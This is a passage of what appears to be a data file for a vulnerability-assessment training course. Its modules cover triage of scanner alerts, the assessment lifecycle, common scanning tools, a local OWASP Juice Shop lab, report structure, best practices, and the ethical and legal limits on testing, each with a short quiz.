        id: 'sec-val-triage-categories',
        title: '2. The Four Rigorous Validation Statuses',
        content: `Every candidate scanner alert must be triaged into exactly one of four objective validation categories:

1. **Confirmed:**
   - *Definition:* Non-destructive verification conclusively proves the flaw exists, preconditions are met, and the system exhibits vulnerable behavior.
   - *Next Step:* Document with timestamped evidence and escalate for prioritized remediation.
2. **False Positive (FP):**
   - *Definition:* Evidence proves the scanner finding is factually incorrect or based on a flawed assumption (e.g., banner mismatch, vendor backport, or honeypot header).
   - *Next Step:* Document proof of absence and submit a suppression rule to the scanner administrator.
3. **Not Applicable (N/A):**
   - *Definition:* The vulnerable binary or setting is physically present on disk, but environmental architecture (such as firewall boundaries, disabled daemons, or lack of user-controlled input) neutralizes the exploit vector.
   - *Next Step:* Document compensating controls; schedule periodic architectural reviews.
4. **Inconclusive:**
   - *Definition:* Collected evidence is ambiguous or contradictory (e.g., a Web Application Firewall blocked the test request or server rate-limiting caused inconsistent responses).
   - *Next Step:* Request authorized internal testing access or coordinate with system owners to inspect server-side execution logs.`,
      },
      {
        id: 'sec-val-practical-examples',
        title: '3. Real-World Validation Case Studies',
        content: `### Case Study A: Validating Missing Security Headers
- **Scanner Alert:** Scanner reports "Missing Content-Security-Policy Header" on \`https://app.example.com\`.
- **Validation Check:** Run \`curl -s -I https://app.example.com | grep -i content-security-policy\`.
- **Observed Evidence:** Output is completely empty; response headers contain only \`Server\`, \`Date\`, and \`Content-Type\`.
- **Validation Status:** **Confirmed**.

### Case Study B: Validating Outdated Software Version with Backports
- **Scanner Alert:** Scanner flags CVE-2020-15778 on OpenSSH 7.4p1 on a CentOS 7 server.
- **Validation Check:** Log into host and query RPM package changelog: \`rpm -q --changelog openssh | grep -i CVE-2020-15778\`.
- **Observed Evidence:** Output shows: \`* Mon Oct 12 2020 Red Hat Security Team - Fix CVE-2020-15778\`.
- **Validation Status:** **False Positive**. The vendor applied the patch while maintaining the upstream 7.4p1 version string.`,
      },
    ],
    comparisonTables: [
      {
        title: 'Validation Status Decision Matrix',
        columns: [
          { key: 'status', label: 'Validation Status' },
          { key: 'evidenceCriteria', label: 'Evidence Criteria' },
          { key: 'engineeringAction', label: 'Engineering Action Required' },
        ],
        rows: [
          {
            status: 'Confirmed',
            evidenceCriteria: 'Vulnerable condition verified reproducible with objective proof',
            engineeringAction: 'Remediate flaw within defined SLA window',
          },
          {
            status: 'False Positive',
            evidenceCriteria: 'Proof that component is patched or finding is an artifact of scanner heuristic error',
            engineeringAction: 'No fix needed; tune scanner rule to eliminate noise',
          },
          {
            status: 'Not Applicable',
            evidenceCriteria: 'Vulnerability present in code but neutralized by architecture or disabled features',
            engineeringAction: 'Maintain compensating controls; verify upon architecture changes',
          },
          {
            status: 'Inconclusive',
            evidenceCriteria: 'Insufficient or contradictory data; WAF or rate limits obstructed clear verdict',
            engineeringAction: 'Coordinate for white-box internal validation or log review',
          },
        ],
      },
    ],
    knowledgeCheck: {
      question: 'Why should a security analyst NEVER classify an unconfirmed scanner finding as a False Positive without verifying documentation or testing?',
      options: [
        'Because False Positives are illegal under federal law',
        'Because prematurely marking an unconfirmed finding as a False Positive can leave a real, critical vulnerability unpatched, creating a dangerous false sense of security',
        'Because scanners can never make mistakes',
        'Because False Positive reports must be signed by the CEO',
      ],
      correctIndex: 1,
      explanation: 'Marking a finding as a False Positive without conclusive proof risks ignoring a real vulnerability. If evidence is ambiguous, it must be classified as Inconclusive and investigated deeper.',
    },
    externalLinks: [
      {
        title: 'OWASP Vulnerability Scanning & Validation Guide',
        url: 'https://owasp.org/www-project-web-security-testing-guide/',
        description: 'Comprehensive testing techniques for validating web application vulnerability findings.',
      },
    ],
  },

  {
    id: 'mod-7',
    slug: 'assessment-methodology',
    moduleNumber: 7,
    title: 'Vulnerability Assessment Methodology',
    shortTitle: 'Methodology',
    subtitle: 'The 10-Phase Assessment Lifecycle and Closed-Loop Retesting',
    estimatedMinutes: 26,
    category: 'Operations & Tools',
    summary: 'Walk through the 10 phases of an industry-standard vulnerability assessment lifecycle: planning, asset discovery, scanning, classification, severity evaluation, validation, risk prioritization, remediation, retesting, and reporting.',
    workflowId: 'lifecycle',
    sections: [
      {
        id: 'sec-meth-lifecycle',
        title: '1. The 10-Phase Vulnerability Assessment Lifecycle',
        content: `A professional vulnerability assessment is an iterative, structured operational lifecycle comprising ten distinct phases:

1. **Planning and Scope Definition:** Establish clear boundaries, obtain written authorization (Rules of Engagement), identify critical assets, and establish emergency contact procedures.
2. **Asset Discovery:** Map the environment to discover all active IP addresses, subnets, domains, and cloud resources.
3. **Vulnerability Scanning:** Deploy credentialed and non-credentialed scanning tools using approved policy templates.
4. **Classification:** Normalize scanner output across disparate tools, map to CWE categories, and de-duplicate redundant findings.
5. **Severity Assessment:** Calculate CVSS v3.1 Base Scores and evaluate threat intelligence (e.g. EPSS and active in-the-wild exploits).
6. **Vulnerability Validation:** Conduct manual inspections and non-destructive checks to eliminate false positives and confirm exploitable weaknesses.
7. **Risk Prioritization:** Calibrate technical severity with organizational asset criticality and business impact to establish remediation SLAs.
8. **Remediation:** Systems administrators, cloud engineers, and developers deploy patches, configuration changes, or compensating controls.
9. **Retesting & Verification:** Re-execute targeted scans and manual validation checks to confirm vulnerabilities are resolved and ensure no regressions occurred. *If an issue remains open, it loops back to scanning/remediation.*
10. **Reporting and Continuous Improvement:** Compile executive summaries and technical remediation reports, updating baseline records and compliance documentation.`,
      },
    ],
    comparisonTables: [
      {
        title: '10 Assessment Lifecycle Phases Overview',
        columns: [
          { key: 'phase', label: 'Phase' },
          { key: 'purpose', label: 'Core Purpose' },
          { key: 'tools', label: 'Primary Tools' },
          { key: 'deliverable', label: 'Key Deliverable' },
        ],
        rows: [
          { phase: '1. Planning', purpose: 'Define authorized scope and ROE', tools: 'Scope matrix, agreements', deliverable: 'Signed Rules of Engagement' },
          { phase: '2. Discovery', purpose: 'Identify live hosts and services', tools: 'Nmap, Masscan, DNSrecon', deliverable: 'Asset & Port Inventory' },
          { phase: '3. Scanning', purpose: 'Automated policy-based checks', tools: 'OpenVAS, Nessus, ZAP', deliverable: 'Raw Scanner Output' },
          { phase: '4. Classification', purpose: 'Normalize and de-duplicate', tools: 'Spreadsheets, CWE DB', deliverable: 'Clean Finding Ledger' },
          { phase: '5. Severity', purpose: 'Compute CVSS & threat score', tools: 'CVSS Calc, NVD, EPSS', deliverable: 'Severity Matrix' },
          { phase: '6. Validation', purpose: 'Eliminate false positives', tools: 'Curl, Burp, Python scripts', deliverable: 'Validated Finding Record' },
          { phase: '7. Prioritization', purpose: 'Rank by business risk & SLA', tools: 'Risk matrix, Jira', deliverable: 'Remediation Roadmap' },
          { phase: '8. Remediation', purpose: 'Deploy patches and hardening', tools: 'Ansible, Patch portals', deliverable: 'Change Deployment Log' },
          { phase: '9. Retesting', purpose: 'Verify fix & loop back if open', tools: 'Nmap, Curl, Scanner', deliverable: 'Retest Sign-off Record' },
          { phase: '10. Reporting', purpose: 'Communicate risks to leadership', tools: 'Report template, PDF', deliverable: 'Formal Assessment Report' },
        ],
      },
    ],
    knowledgeCheck: {
      question: 'During the Retesting phase, if a previously flagged vulnerability still responds to a safe verification check, what must happen?',
      options: [
        'Close the ticket anyway to avoid failing monthly metrics',
        'Trigger the retest return loop, keeping the ticket open and routing the evidence back to engineering for re-patching',
        'Delete the affected server from the corporate asset inventory',
        'Switch the scanner off',
      ],
      correctIndex: 1,
      explanation: 'A vulnerability assessment is a closed-loop process. If a retest fails, the issue cannot be marked resolved; it returns to engineering with fresh evidence until verification passes.',
    },
    externalLinks: [
      {
        title: 'NIST SP 800-115 Technical Guide to Information Security Testing',
        url: 'https://csrc.nist.gov/publications/detail/sp/800-115/final',
        description: 'Standard methodology recommendations for testing, analysis, and reporting.',
      },
    ],
  },

  {
    id: 'mod-8',
    slug: 'security-tools',
    moduleNumber: 8,
    title: 'Vulnerability Assessment Tools',
    shortTitle: 'Security Tools',
    subtitle: 'Nmap, OWASP ZAP, Greenbone/OpenVAS, Burp Suite, and Vulnerability Databases',
    estimatedMinutes: 24,
    category: 'Operations & Tools',
    summary: 'Compare essential tools used across the assessment lifecycle. Understand where Nmap, OWASP ZAP, OpenVAS, Burp Suite, and NVD fit, their respective strengths, and practical limitations.',
    workflowId: 'lifecycle',
    sections: [
      {
        id: 'sec-tools-overview',
        title: '1. Right Tool for the Right Phase',
        content: `A common beginner misconception is assuming one tool does everything. In reality, modern security operations use specialized tools for specialized tasks:

- **Network Discovery & Fingerprinting:** Nmap
- **Web Application Vulnerability Scanning:** OWASP ZAP
- **Comprehensive Infrastructure Scanning:** Greenbone Community Edition (OpenVAS)
- **Manual Web Interception & Validation:** Burp Suite Professional / Community
- **Vulnerability Intelligence & Scoring:** NIST National Vulnerability Database (NVD) & FIRST CVSS Calculator.`,
      },
      {
        id: 'sec-tools-nmap',
        title: '2. Nmap (Network Mapper)',
        content: `**Nmap** is the premier open-source tool for network discovery, host detection, port enumeration, and OS fingerprinting.

- **Primary Role:** Phase 2 (Asset Discovery) and service version detection.
- **Key Features:** High-speed TCP SYN scan (\`-sS\`), service version interrogation (\`-sV\`), OS detection (\`-O\`), and extensible scripting engine (NSE).
- **Limitation:** Nmap is not a full-featured vulnerability scanner; its NSE scripts can detect specific known flaws, but it does not maintain comprehensive vulnerability databases like OpenVAS or Nessus.
- **Official Site:** [https://nmap.org/](https://nmap.org/)`,
      },
      {
        id: 'sec-tools-zap',
        title: '3. OWASP ZAP (Zed Attack Proxy)',
        content: `**OWASP ZAP** is a free, open-source Dynamic Application Security Testing (DAST) tool designed for testing web applications and APIs.

- **Primary Role:** Phase 3 (Web Scanning) and Phase 6 (Validation).
- **Key Features:** Automated spider/crawler, passive HTTP header inspection, active vulnerability scanner, AJAX spider for single-page applications (SPAs).
- **Official Site:** [https://www.zaproxy.org/](https://www.zaproxy.org/)`,
      },
      {
        id: 'sec-tools-openvas',
        title: '4. Greenbone Community Edition (OpenVAS)',
        content: `**Greenbone/OpenVAS** is a full-featured network vulnerability scanner with a feed of over 100,000 Network Vulnerability Tests (NVTs).

- **Primary Role:** Phase 3 (Vulnerability Scanning) and compliance baseline audits.
- **Key Features:** Comprehensive multi-host scanning, authenticated Linux/Windows audits, CVE correlation, detailed remediation reports.
- **Official Site:** [https://www.greenbone.net/](https://www.greenbone.net/)`,
      },
      {
        id: 'sec-tools-burp',
        title: '5. Burp Suite',
        content: `**Burp Suite** is the leading web application security testing platform developed by PortSwigger.

- **Primary Role:** Phase 6 (Vulnerability Validation) and manual request/response tampering.
- **Key Features:** Intercepting HTTP proxy, Repeater for manual request replay, Intruder for automated fuzzing, and detailed vulnerability scanner.
- **Official Site:** [https://portswigger.net/burp](https://portswigger.net/burp)`,
      },
    ],
    comparisonTables: [
      {
        title: 'Security Assessment Tool Taxonomy',
        columns: [
          { key: 'tool', label: 'Tool' },
          { key: 'category', label: 'Primary Category' },
          { key: 'strengths', label: 'Greatest Strengths' },
          { key: 'limitations', label: 'Key Limitations' },
        ],
        rows: [
          {
            tool: 'Nmap',
            category: 'Port & Service Discovery',
            strengths: 'Fast host discovery, service fingerprinting, OS detection',
            limitations: 'Does not perform deep web app or comprehensive CVE scanning',
          },
          {
            tool: 'OWASP ZAP',
            category: 'Web App DAST Scanner',
            strengths: 'Open source, excellent API integration, great automated crawler',
            limitations: 'Limited infrastructure and operating system scanning capability',
          },
          {
            tool: 'OpenVAS / Greenbone',
            category: 'Network Vulnerability Scanner',
            strengths: 'Broad feed of 100,000+ CVE tests, authenticated host audits',
            limitations: 'Heavy resource requirements, can be slow on large subnets',
          },
          {
            tool: 'Burp Suite',
            category: 'HTTP Interception & Validation',
            strengths: 'Superior manual request replay (Repeater) for validation',
            limitations: 'Commercial scanner requires paid license',
          },
        ],
      },
    ],
    knowledgeCheck: {
      question: 'Which tool is most effective for an analyst wishing to manually replay and modify a single HTTP POST request to safely validate a reported XSS vulnerability?',
      options: [
        'Nmap using a ping sweep',
        'Burp Suite Repeater',
        'OpenVAS full subnet scan',
        'Wireshark packet capture on loopback',
      ],
      correctIndex: 1,
      explanation: 'Burp Suite Repeater is specifically engineered for fine-grained, manual modification and re-transmission of individual HTTP requests, making it the ideal tool for safe vulnerability validation.',
    },
    externalLinks: [
      { title: 'Nmap Official Project', url: 'https://nmap.org/', description: 'Network exploration tool and security scanner.' },
      { title: 'OWASP ZAP', url: 'https://www.zaproxy.org/', description: 'The world’s most widely used web application scanner.' },
      { title: 'Greenbone Community', url: 'https://www.greenbone.net/', description: 'Open-source vulnerability management solutions.' },
      { title: 'PortSwigger Burp Suite', url: 'https://portswigger.net/burp', description: 'Web application security testing platform.' },
    ],
  },

  {
    id: 'mod-9',
    slug: 'practical-lab',
    moduleNumber: 9,
    title: 'Practical Lab: OWASP Juice Shop',
    shortTitle: 'Practical Lab',
    subtitle: 'Isolated Docker Lab Setup, Step-by-Step Discovery, and Report Generation',
    estimatedMinutes: 30,
    category: 'Operations & Tools',
    summary: 'Set up an isolated local lab using Docker and OWASP Juice Shop on loopback (127.0.0.1). Follow step-by-step discovery, header inspection, CVE analysis, and create a formal assessment report with PDF export.',
    workflowId: 'lifecycle',
    sections: [
      {
        id: 'sec-lab-overview',
        title: '1. Laboratory Aim and Architecture',
        content: `**Aim:** To provide beginners and students with hands-on, safe practical experience conducting a professional vulnerability assessment against a modern web application in an isolated local environment.

**Safety Mandate:** All laboratory exercises are strictly restricted to the local loopback interface (\`127.0.0.1:3000\`). Binding the container to \`127.0.0.1\` ensures that your vulnerable training application is inaccessible from your local network or the internet.

### Quick Commands Reference
\`\`\`bash
# 1. Start isolated container
docker run --rm -d -p 127.0.0.1:3000:3000 --name juice-shop bkimminich/juice-shop

# 2. Service discovery with Nmap
nmap -sV -p 3000 127.0.0.1

# 3. Clean up container when done
docker stop juice-shop
\`\`\``,
      },
    ],
    knowledgeCheck: {
      question: 'Why is it critical to include "127.0.0.1:" in the Docker port mapping command "-p 127.0.0.1:3000:3000"?',
      options: [
        'To speed up Docker download speeds by 50%',
        'To bind the exposed port strictly to the local loopback interface, preventing others on your local Wi-Fi/LAN from accessing the vulnerable container',
        'Because Docker cannot run on port 3000 without it',
        'To automatically obtain an SSL certificate from Let\'s Encrypt',
      ],
      correctIndex: 1,
      explanation: 'Without specifying 127.0.0.1, Docker defaults to binding on 0.0.0.0 (all network interfaces), exposing the deliberately vulnerable target to any host on your local network.',
    },
    externalLinks: [
      {
        title: 'OWASP Juice Shop Official Project',
        url: 'https://owasp.org/www-project-juice-shop/',
        description: 'The most modern and sophisticated deliberately insecure web application.',
      },
    ],
  },

  {
    id: 'mod-10',
    slug: 'sample-reports',
    moduleNumber: 10,
    title: 'Sample Vulnerability Assessment Reports',
    shortTitle: 'Sample Reports',
    subtitle: 'Professional Report Structure, Executive Summaries, and Finding Documentation',
    estimatedMinutes: 20,
    category: 'Operations & Tools',
    summary: 'Analyze the structure of enterprise vulnerability assessment reports. Study executive summaries, technical findings registers, CVSS scoring tables, and actionable remediation roadmaps.',
    sections: [
      {
        id: 'sec-report-structure',
        title: '1. Anatomy of an Enterprise Vulnerability Assessment Report',
        content: `A vulnerability assessment report is the primary tangible deliverable of your engagement. It must serve two distinct audiences:

1. **Executive Stakeholders (CISO, CTO, Board of Directors):** Require high-level risk metrics, strategic trends, compliance status, and budget priorities without deep technical jargon.
2. **Technical Custodians (DevOps, System Administrators):** Require exact host IPs, CVE IDs, CVSS vector strings, reproducible proof of concepts, and step-by-step remediation commands.

### Standard Report Structure
1. Title Page with Scope, Dates, and Assessor Names.
2. Executive Summary & Risk Posture Overview.
3. Scope, Rules of Engagement, and Environment Limitations.
4. Methodology and Scanning Tool Inventory.
5. Findings Register Summary Table (Severity, Status, Retest).
6. Detailed Technical Finding Breakdown (Evidence, Impact, Remediation).
7. Remediation Roadmap & Prioritized SLAs.
8. Retest Results and Sign-off.`,
      },
    ],
    knowledgeCheck: {
      question: 'Which section of a vulnerability assessment report is intended specifically for the C-suite and Board of Directors?',
      options: [
        'Raw Nmap packet trace hex dumps',
        'Executive Summary with risk posture metrics, impact overview, and strategic recommendations',
        'Full list of all 10,000 closed ports',
        'Source code disassembly',
      ],
      correctIndex: 1,
      explanation: 'The Executive Summary translates technical findings into business risk, communicating overall exposure, strategic recommendations, and high-level trends to leadership.',
    },
  },

  {
    id: 'mod-11',
    slug: 'best-practices',
    moduleNumber: 11,
    title: 'Best Practices for Vulnerability Management',
    shortTitle: 'Best Practices',
    subtitle: 'Continuous Asset Discovery, Baselines, Risk-Based Remediation, and Least Privilege',
    estimatedMinutes: 22,
    category: 'Professional Practice',
    summary: 'Discover enterprise best practices for moving from reactive scanning to continuous vulnerability management. Explore asset baselines, risk-based SLAs, and patch orchestration.',
    sections: [
      {
        id: 'sec-bp-principles',
        title: '1. Ten Commandments of Vulnerability Management',
        content: `1. **Maintain an Accurate Asset Inventory:** You cannot protect what you do not know exists. Continuously discover shadow IT and rogue cloud instances.
2. **Perform Regular, Scheduled Assessments:** Monthly or continuous vulnerability scanning is far superior to once-a-year compliance audits.
3. **Establish Hardened Baselines:** Use CIS Benchmarks or DISA STIGs across all operating systems and container images.
4. **Prioritize by Business Risk, Not Just CVSS:** Incorporate threat intelligence (EPSS) and asset criticality into remediation SLAs.
5. **Remediate Within Defined SLAs:** Critical flaws (24-72 hours), High (14 days), Medium (30 days), Low (90 days).
6. **Enforce Principle of Least Privilege:** Minimize administrative accounts, disable default credentials, and restrict network permissions.
7. **Always Retest After Patching:** Never assume a patch deployed cleanly without verifying that the vulnerability is eliminated.
8. **Document Exceptions and False Positives:** Maintain an audited exception register for non-applicable findings with compensating controls.
9. **Implement Comprehensive Centralized Logging:** Retain authentication, firewall, and access logs to detect active exploit attempts.
10. **Pursue Continuous Improvement:** Conduct post-mortem reviews after critical security patches to optimize discovery and deployment pipelines.`,
      },
    ],
    knowledgeCheck: {
      question: 'Under typical enterprise vulnerability management policy, what is the standard recommended remediation SLA for a Critical severity vulnerability with active exploits in the wild?',
      options: [
        '180 to 365 days',
        '24 to 72 hours (Immediate emergency change window)',
        'Whenever the system is retired in 5 years',
        'Never; wait until an auditor requests it',
      ],
      correctIndex: 1,
      explanation: 'Critical vulnerabilities with active exploits require emergency patching within 24 to 72 hours to prevent imminent exploitation and ransomware deployment.',
    },
  },

  {
    id: 'mod-12',
    slug: 'va-vs-pentesting',
    moduleNumber: 12,
    title: 'Vulnerability Assessment vs Penetration Testing',
    shortTitle: 'VA vs Pentesting',
    subtitle: 'Key Distinctions in Objectives, Methodology, Exploitation, and Deliverables',
    estimatedMinutes: 18,
    category: 'Professional Practice',
    summary: 'Understand the fundamental differences between vulnerability assessment and penetration testing. Compare breadth versus depth, automated coverage versus human exploitation, and reporting deliverables.',
    sections: [
      {
        id: 'sec-va-vs-pt',
        title: '1. Complementary, Not Competing Disciplines',
        content: `A vulnerability assessment and a penetration test are complementary security evaluations that serve different objectives:

- **Vulnerability Assessment (VA):** Focuses on **breadth**. It identifies as many known vulnerabilities as possible across all assets in scope, verifies their validity, and categorizes them by severity. It deliberately avoids disruptive exploitation.
- **Penetration Testing (PT):** Focuses on **depth**. It simulates a realistic cyberattack where ethical hackers identify specific vulnerability chains, exploit them to gain unauthorized access, move laterally across the network, and demonstrate realistic business impact.`,
      },
    ],
    comparisonTables: [
      {
        title: 'Comprehensive Vulnerability Assessment vs Penetration Testing Matrix',
        columns: [
          { key: 'dimension', label: 'Dimension' },
          { key: 'va', label: 'Vulnerability Assessment (VA)' },
          { key: 'pt', label: 'Penetration Testing (PT)' },
        ],
        rows: [
          { dimension: 'Primary Goal', va: 'Identify and catalog all known weaknesses across all assets', pt: 'Demonstrate whether and how an adversary can breach defenses' },
          { dimension: 'Scope Focus', va: 'Breadth (broad coverage of entire IP ranges and applications)', pt: 'Depth (focused attack paths to achieve specific objectives)' },
          { dimension: 'Exploitation', va: 'Non-destructive; verifies presence without weaponization', pt: 'Active exploitation, privilege escalation, and lateral movement' },
          { dimension: 'Tooling', va: 'Automated scanners (OpenVAS, ZAP) + manual validation', pt: 'Manual attack frameworks (Burp Suite, Metasploit, custom code)' },
          { dimension: 'Execution Frequency', va: 'Continuous, weekly, or monthly scheduled runs', pt: 'Annually or after major architectural updates' },
          { dimension: 'Key Deliverable', va: 'Comprehensive vulnerability register and remediation list', pt: 'Attack narrative report documenting exploited compromise paths' },
        ],
      },
    ],
    knowledgeCheck: {
      question: 'Which of the following activities is a defining characteristic of a Penetration Test, but is NOT performed during a standard Vulnerability Assessment?',
      options: [
        'Discovering active network IP addresses',
        'Actively pivoting through a compromised server to breach internal databases and extract sensitive data proofs',
        'Checking if software versions have known CVEs',
        'Calculating CVSS Base Scores',
      ],
      correctIndex: 1,
      explanation: 'Lateral movement, pivoting, and weaponized exploitation to demonstrate tangible business impact are defining characteristics of penetration testing, whereas vulnerability assessment focuses on broad, safe identification and validation.',
    },
  },

  {
    id: 'mod-13',
    slug: 'ethics-and-safety',
    moduleNumber: 13,
    title: 'Ethical and Legal Considerations',
    shortTitle: 'Ethics & Safety',
    subtitle: 'Authorization, Rules of Engagement, Responsible Disclosure, and Legal Boundaries',
    estimatedMinutes: 18,
    category: 'Professional Practice',
    summary: 'Review critical legal boundaries, the Computer Fraud and Abuse Act (CFAA), written Rules of Engagement (ROE), safe testing practices, and ethical duties of security professionals.',
    sections: [
      {
        id: 'sec-ethics-authorization',
        title: '1. The Golden Rule of Security Testing',
        content: `> **IMPORTANT NOTICE:** Only assess systems you own or have explicit, signed, written permission to test. Testing unauthorized systems is strictly illegal and violates computer crime laws worldwide.

In the United States, unauthorized testing violates the **Computer Fraud and Abuse Act (CFAA, 18 U.S.C. § 1030)** and state computer crime statutes. In the UK, it violates the **Computer Misuse Act 1990**. Penalties include substantial criminal fines and federal imprisonment.

### Key Tenets of Professional Security Operations
- **Written Rules of Engagement (ROE):** Always secure signed authorization defining the exact in-scope IP addresses, testing windows, emergency contacts, and excluded systems.
- **Safe, Non-Destructive Testing:** Avoid volumetric denial-of-service tests or destructive commands on production assets.
- **Data Protection:** If sensitive customer or proprietary data is encountered during testing, halt immediately, sanitize proof screenshots, and inform the asset owner via secure channels.
- **Responsible Disclosure:** Report vulnerabilities privately to vendors or asset owners, providing a reasonable window (e.g. 90 days) to deploy patches before public disclosure.`,
      },
    ],
    knowledgeCheck: {
      question: 'What is the very first document that must be signed before launching any vulnerability assessment against an external organization?',
      options: [
        'A social media disclosure tweet',
        'Written Rules of Engagement (ROE) and formal testing authorization from the authorized system owner',
        'A purchase receipt for scanning software',
        'A bug bounty payout invoice',
      ],
      correctIndex: 1,
      explanation: 'Formal written authorization and a signed Rules of Engagement document are mandatory legal prerequisites before conducting any security assessment activity.',
    },
  },

  {
    id: 'mod-14',
    slug: 'references',
    moduleNumber: 14,
    title: 'Verified Official References',
    shortTitle: 'References',
    subtitle: 'Authoritative Cybersecurity Standards, Standards Bodies, and Tools',
    estimatedMinutes: 12,
    category: 'Standards & Metrics',
    summary: 'A curated catalog of verified official references including CVE, NVD, FIRST CVSS, OWASP Top 10, OWASP Juice Shop, and leading scanner documentation.',
    sections: [
      {
        id: 'sec-refs-list',
        title: '1. Official Standards and Authorities',
        content: `All links open official documentation in a new browser tab with safe external link attributes.`,
      },
    ],
    externalLinks: [
      {
        title: 'CVE Program (cve.org)',
        url: 'https://www.cve.org/',
        description: 'The official home of the CVE List, maintained by the MITRE Corporation and international CNAs.',
      },
      {
        title: 'NIST National Vulnerability Database (NVD)',
        url: 'https://nvd.nist.gov/',
        description: 'U.S. government repository of standards-based vulnerability management data.',
      },
      {
        title: 'FIRST CVSS Documentation & Standards',
        url: 'https://www.first.org/cvss/',
        description: 'Common Vulnerability Scoring System specification documents, calculators, and user guides.',
      },
      {
        title: 'OWASP Top 10 Security Risks',
        url: 'https://owasp.org/www-project-top-ten/',
        description: 'Globally recognized awareness document representing a broad consensus on the most critical security risks.',
      },
      {
        title: 'OWASP Juice Shop Project',
        url: 'https://owasp.org/www-project-juice-shop/',
        description: 'Official repository and guide for the deliberately insecure web application used in our practical lab.',
      },
      {
        title: 'OWASP ZAP Project',
        url: 'https://www.zaproxy.org/',
        description: 'Open-source web application scanner maintained by the security community.',
      },
      {
        title: 'Nmap Project',
        url: 'https://nmap.org/',
        description: 'Free and open source utility for network discovery and vulnerability scanning.',
      },
      {
        title: 'Greenbone Community (OpenVAS)',
        url: 'https://www.greenbone.net/',
        description: 'Open source vulnerability management and security testing suite.',
      },
      {
        title: 'PortSwigger Burp Suite',
        url: 'https://portswigger.net/burp',
        description: 'Industry-standard toolkit for web application penetration testing and manual validation.',
      },
    ],
  },
];
